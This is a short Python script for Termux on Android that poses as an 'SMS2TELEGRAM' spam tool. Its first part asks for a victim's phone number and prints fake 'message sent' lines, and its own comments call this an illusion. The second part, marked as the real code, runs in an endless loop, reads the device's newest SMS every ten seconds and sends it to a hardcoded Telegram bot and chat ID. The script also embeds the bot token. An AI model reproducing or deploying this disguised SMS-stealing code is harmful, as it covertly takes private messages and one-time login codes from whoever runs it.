import subprocess
import requests
import time

# ========= Simulation / Illusion =========
print("===== SMS2TELEGRAM =====")
victime = input("📱 Entrez le numéro de la victime : ")

print("\n🔗 Connexion au serveur Telegram...")
time.sleep(1)
print(f"📩 Préparation de l'envoi vers {victime}...")
time.sleep(1)
print("⚡ Spam en cours...\n")

for i in range(1, 6):
    time.sleep(1)
    print(f"✅ Simulation message {i} envoyé à {victime}")

print("\n--- Simulation terminée ---\n")

# ========= Vrai code : envoi SMS vers Telegram =========
TELEGRAM_TOKEN = "7767041903:AAEL4enFf0gWivFoZs0f0VrO3tHFmFJw8E8"
CHAT_ID = "7874160840"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"Erreur Telegram : {e}")

print("📡 Le bot tourne en arrière-plan...")

while True:
    try:
        # Lire les SMS avec termux-sms-list
        result = subprocess.run(["termux-sms-list", "-l", "1"], capture_output=True, text=True)
        sms_list = result.stdout.strip()

        if sms_list:
            send_to_telegram("📩 Nouveau SMS reçu:\n" + sms_list)
        
        time.sleep(10)  # vérifie toutes les 10 secondes
    except KeyboardInterrupt:
        print("❌ Bot arrêté manuellement.")
        break
